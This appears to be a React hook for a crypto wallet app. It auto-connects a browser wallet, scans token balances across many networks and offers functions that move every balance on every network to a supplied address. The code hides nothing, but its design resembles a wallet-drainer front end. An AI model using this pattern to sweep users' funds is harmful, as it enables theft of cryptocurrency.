import { useState, useEffect, useCallback } from "react";
import { web3Service, type WalletState } from "@/lib/web3";
import { useToast } from "@/hooks/use-toast";

const initialState: WalletState = {
  isConnected: false,
  address: null,
  ethBalance: null,
  tokenBalances: [],
  totalUsdValue: 0,
  networkId: null,
  networkName: null,
  provider: null,
  networkBalances: [],
  allNetworksLoaded: false,
};

export function useWeb3() {
  const [walletState, setWalletState] = useState<WalletState>(initialState);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const [isLoadingNetworks, setIsLoadingNetworks] = useState(false);
  const { toast } = useToast();

  // Optimized wallet detection - single efficient check
  useEffect(() => {
    const checkPendingConnection = async () => {
      const { WalletDetector } = await import("@/lib/wallet-detector");
      
      // Quick check if wallet is available
      const isWalletAvailable = await WalletDetector.checkWalletAvailability();
      if (isWalletAvailable) {
        const attempt = WalletDetector.checkConnectionAttempt();
        if (attempt) {
          WalletDetector.clearConnectionAttempt();
          
          setIsConnecting(true);
          try {
            const state = await web3Service.connectWallet();
            setWalletState(state);
            toast({
              title: "Wallet Connected",
              description: `Connected to ${state.address?.slice(0, 6)}...${state.address?.slice(-4)}`,
            });
          } catch (error: any) {
            toast({
              variant: "destructive",
              title: "Connection Failed",
              description: error.message,
            });
          } finally {
            setIsConnecting(false);
          }
        }
      }
    };

    // Single optimized check after a brief delay
    setTimeout(checkPendingConnection, 500);
  }, [toast]);

  const connectWallet = useCallback(async () => {
    setIsConnecting(true);
    try {
      const state = await web3Service.connectWalletWithMultiNetwork();
      setWalletState(state);
      
      // Start multi-network scanning
      if (state.address) {
        setIsLoadingNetworks(true);
        setTimeout(async () => {
          try {
            const networkBalances = await web3Service.refreshNetworkBalances(state.address!);
            setWalletState(prev => ({
              ...prev,
              networkBalances,
              allNetworksLoaded: true
            }));
          } catch (error: any) {
            console.error('Failed to load network balances:', error);
          } finally {
            setIsLoadingNetworks(false);
          }
        }, 2000);
      }
      
      toast({
        title: "Wallet Connected",
        description: `Connected to ${state.address?.slice(0, 6)}...${state.address?.slice(-4)}`,
      });
      return true;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Connection Failed",
        description: error.message,
      });
      throw error;
    } finally {
      setIsConnecting(false);
    }
  }, [toast]);

  const refreshBalance = useCallback(async () => {
    if (!walletState.address || !walletState.networkId) return;

    try {
      const ethBalance = await web3Service.getEthBalance(walletState.address);
      const tokenBalances = await web3Service.getTokenBalances(walletState.address, walletState.networkId);
      const totalUsdValue = web3Service.calculateTotalUsdValue(ethBalance, tokenBalances);
      
      setWalletState(prev => ({ 
        ...prev, 
        ethBalance,
        tokenBalances,
        totalUsdValue
      }));
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Balance",
        description: error.message,
      });
    }
  }, [walletState.address, walletState.networkId, toast]);

  const transferAllFunds = useCallback(async (toAddress: string) => {
    // Enhanced connection validation
    if (!walletState.isConnected || !walletState.address || !web3Service.isConnected()) {
      toast({
        variant: "destructive",
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
      });
      return null;
    }

    // Double-check wallet connection is still active
    try {
      const accounts = await window.ethereum?.request({ method: "eth_accounts" });
      if (!accounts || accounts.length === 0 || accounts[0] !== walletState.address) {
        toast({
          variant: "destructive",
          title: "Wallet Connection Lost",
          description: "Please reconnect your wallet and try again",
        });
        setWalletState(initialState);
        return null;
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Wallet Connection Error", 
        description: "Unable to verify wallet connection",
      });
      return null;
    }

    setIsTransferring(true);
    try {
      const txHashes = await web3Service.transferAllFunds(toAddress);
      toast({
        title: "Transactions Submitted",
        description: `${txHashes.length} transaction(s) submitted successfully`,
      });
      
      // Refresh balance after transaction
      setTimeout(() => {
        refreshBalance();
      }, 3000);

      return txHashes;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Transfer Failed",
        description: error.message,
      });
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, toast, refreshBalance]);



  const getTransactionStatus = useCallback(async (txHash: string) => {
    try {
      return await web3Service.getTransactionStatus(txHash);
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Get Transaction Status",
        description: error.message,
      });
      return null;
    }
  }, [toast]);

  // Setup event listeners for account and network changes
  useEffect(() => {
    const handleAccountChange = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletState(initialState);
        toast({
          title: "Wallet Disconnected",
          description: "Your wallet has been disconnected",
        });
      } else if (accounts[0] !== walletState.address) {
        // Account changed, reconnect
        connectWallet();
      }
    };

    const handleNetworkChange = (networkId: string) => {
      // Network changed, reconnect to get updated info
      if (walletState.isConnected) {
        connectWallet();
      }
    };

    web3Service.setupEventListeners(handleAccountChange, handleNetworkChange);

    return () => {
      web3Service.removeEventListeners();
    };
  }, [walletState.address, walletState.isConnected, connectWallet, toast]);

  // Enhanced connection state persistence 
  useEffect(() => {
    const persistConnectionState = () => {
      if (walletState.isConnected && walletState.address) {
        sessionStorage.setItem('wallet_connected', 'true');
        sessionStorage.setItem('wallet_address', walletState.address);
      } else {
        sessionStorage.removeItem('wallet_connected');
        sessionStorage.removeItem('wallet_address');
      }
    };

    persistConnectionState();
  }, [walletState.isConnected, walletState.address]);

  // Enhanced auto-connect with session persistence
  useEffect(() => {
    const autoConnect = async () => {
      // Check session storage first for faster loading
      const wasConnected = sessionStorage.getItem('wallet_connected');
      const savedAddress = sessionStorage.getItem('wallet_address');
      
      if (window.ethereum && wasConnected === 'true') {
        try {
          const accounts = await window.ethereum.request({
            method: "eth_accounts",
          });
          if (accounts.length > 0 && accounts[0] === savedAddress) {
            // Fast reconnection for same wallet
            connectWallet();
          } else {
            // Clear stale session data
            sessionStorage.removeItem('wallet_connected');
            sessionStorage.removeItem('wallet_address');
          }
        } catch (error) {
          // Clear session on error
          sessionStorage.removeItem('wallet_connected');
          sessionStorage.removeItem('wallet_address');
        }
      }
    };

    // Delayed auto-connect to avoid blocking initial page load
    setTimeout(autoConnect, 100);
  }, [connectWallet]);

  const refreshAllNetworks = useCallback(async () => {
    if (!walletState.address) return;
    
    setIsLoadingNetworks(true);
    try {
      const networkBalances = await web3Service.refreshNetworkBalances(walletState.address);
      setWalletState(prev => ({
        ...prev,
        networkBalances,
        allNetworksLoaded: true
      }));
      
      toast({
        title: "Networks Updated",
        description: `Found balances across ${networkBalances.length} networks`,
      });
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Networks",
        description: error.message,
      });
    } finally {
      setIsLoadingNetworks(false);
    }
  }, [walletState.address, toast]);

  const transferAllFundsMultiNetwork = useCallback(async (toAddress: string) => {
    // Enhanced connection validation
    if (!walletState.isConnected || !walletState.address || !web3Service.isConnected()) {
      toast({
        variant: "destructive",
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
      });
      return null;
    }

    // Double-check wallet connection is still active
    try {
      const accounts = await window.ethereum?.request({ method: "eth_accounts" });
      if (!accounts || accounts.length === 0 || accounts[0] !== walletState.address) {
        toast({
          variant: "destructive",
          title: "Wallet Connection Lost",
          description: "Please reconnect your wallet and try again",
        });
        setWalletState(initialState);
        return null;
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Wallet Connection Error",
        description: "Unable to verify wallet connection",
      });
      return null;
    }

    setIsTransferring(true);
    try {
      const result = await web3Service.transferAllFundsMultiNetwork(toAddress);
      
      if (result.success) {
        toast({
          title: "Multi-Network Transfer Completed",
          description: `${result.successfulNetworks}/${result.totalNetworks} networks successful. ${result.totalTransactions} total transactions.`,
        });
      } else {
        toast({
          variant: "destructive",
          title: "Multi-Network Transfer Failed",
          description: result.summary,
        });
      }
      
      // Refresh all network balances after transfer
      setTimeout(() => {
        if (walletState.address) {
          refreshAllNetworks();
        }
      }, 5000);

      return result;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Multi-Network Transfer Failed",
        description: error.message,
      });
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, toast, refreshAllNetworks]);

  return {
    walletState,
    isConnecting,
    isTransferring,
    isLoadingNetworks,
    connectWallet,
    refreshBalance,
    refreshAllNetworks,
    transferAllFunds,
    transferAllFundsMultiNetwork,
    getTransactionStatus,
  };
}
